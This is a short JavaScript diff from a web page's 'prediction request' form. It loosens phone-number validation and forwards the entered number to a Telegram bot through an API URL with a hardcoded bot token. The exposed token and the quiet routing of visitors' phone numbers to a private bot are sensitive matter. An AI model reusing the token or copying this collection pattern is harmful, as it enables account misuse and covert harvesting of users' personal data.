@@ -93,8 +93,8 @@ document.addEventListener("DOMContentLoaded", function() {
   });
 
   sendPhoneNumberButton.addEventListener("click", function() {
-    const phoneNumber = document.getElementById("phoneNumber").value;
-    if (phoneNumber.length === 10) {
+    const phoneNumber = document.getElementById("phoneNumber").value.trim();
+    if (phoneNumber) {
       // Send phone number information to Telegram bot API
       const apiEndpoint = "https://api.telegram.org/bot7067694188:AAHh4NDaHXXn-Yu-nEvEcWewPkfxPveriEQ/sendMessage";
       const message = "New prediction request. Phone number: " + phoneNumber;
